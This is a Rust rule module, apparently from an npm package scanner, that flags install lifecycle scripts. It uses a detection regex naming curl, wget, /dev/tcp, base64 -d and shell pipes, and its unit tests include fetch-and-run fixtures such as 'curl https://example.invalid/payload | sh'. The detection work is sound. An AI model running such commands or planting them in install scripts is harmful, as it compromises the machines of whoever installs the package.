use crate::model::{Evidence, PackageFacts, Reason, ReasonCode, Severity};
use regex::Regex;
use std::sync::OnceLock;

pub fn run(facts: &PackageFacts) -> Vec<Reason> {
    let mut install_evidence = Vec::new();
    let mut dangerous_evidence = Vec::new();

    for script in facts.lifecycle_scripts() {
        if dangerous_pattern().is_match(&script.command) {
            dangerous_evidence.push(script.evidence.clone());
        } else {
            install_evidence.push(script.evidence.clone());
        }
    }

    let mut reasons = Vec::new();
    if !dangerous_evidence.is_empty() {
        reasons.push(reason(
            ReasonCode::DangerousInstallScript,
            Severity::High,
            "Install script runs a dangerous command",
            "The package runs an install lifecycle script containing a command commonly used for download or shell execution.",
            dangerous_evidence,
        ));
    }

    if !install_evidence.is_empty() {
        reasons.push(reason(
            ReasonCode::InstallScriptPresent,
            Severity::Medium,
            "Install script runs during installation",
            "The package defines an npm install lifecycle script that executes during installation.",
            install_evidence,
        ));
    }

    reasons
}

fn reason(
    code: ReasonCode,
    severity: Severity,
    title: &str,
    detail: &str,
    evidence: Vec<Evidence>,
) -> Reason {
    Reason {
        code,
        severity,
        title: title.to_string(),
        detail: detail.to_string(),
        evidence,
    }
}

fn dangerous_pattern() -> &'static Regex {
    static DANGEROUS_PATTERN: OnceLock<Regex> = OnceLock::new();
    DANGEROUS_PATTERN.get_or_init(|| {
        Regex::new(r"(?i)(?:^|[\s;&|()`])(?:curl|wget|powershell)(?:$|[\s;&|()])|node\s+-e|base64\s+-d|child_process|/dev/tcp|\|\s*(?:sh|bash)|bash\s+-c").unwrap()
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{Evidence, FileFacts, LifecycleHook, LifecycleScriptObs, PackageFacts};

    fn facts(scripts: Vec<(LifecycleHook, &str)>) -> PackageFacts {
        PackageFacts {
            files: vec![FileFacts {
                path: "package.json".to_string(),
                lifecycle_scripts: scripts
                    .into_iter()
                    .enumerate()
                    .map(|(index, (hook, command))| LifecycleScriptObs {
                        hook,
                        command: command.to_string(),
                        evidence: Evidence {
                            file: "package.json".to_string(),
                            line: index + 1,
                            snippet: format!("\"{}\": \"{}\"", hook.as_str(), command),
                        },
                    })
                    .collect(),
                encoded_literals: Vec::new(),
                endpoints: Vec::new(),
                decoded_evals: Vec::new(),
                sources: Vec::new(),
                sinks: Vec::new(),
                flows: Vec::new(),
            }],
        }
    }

    #[test]
    fn safe_lifecycle_script_emits_install_script_present() {
        let reasons = run(&facts(vec![(LifecycleHook::Postinstall, "node index.js")]));

        assert_eq!(reasons.len(), 1);
        assert_eq!(reasons[0].code, ReasonCode::InstallScriptPresent);
        assert_eq!(reasons[0].severity, Severity::Medium);
        assert_eq!(reasons[0].evidence[0].line, 1);
    }

    #[test]
    fn dangerous_lifecycle_script_emits_only_dangerous_reason() {
        let reasons = run(&facts(vec![(
            LifecycleHook::Postinstall,
            "curl https://example.invalid/payload | sh",
        )]));

        assert_eq!(reasons.len(), 1);
        assert_eq!(reasons[0].code, ReasonCode::DangerousInstallScript);
        assert_eq!(reasons[0].severity, Severity::High);
    }

    #[test]
    fn backtick_subshell_curl_emits_dangerous_reason() {
        let reasons = run(&facts(vec![(
            LifecycleHook::Postinstall,
            "`curl -s https://example.invalid/payload`",
        )]));

        assert_eq!(reasons.len(), 1);
        assert_eq!(reasons[0].code, ReasonCode::DangerousInstallScript);
        assert_eq!(reasons[0].severity, Severity::High);
    }

    #[test]
    fn no_lifecycle_scripts_emit_no_reasons() {
        let reasons = run(&PackageFacts { files: Vec::new() });

        assert!(reasons.is_empty());
    }
}
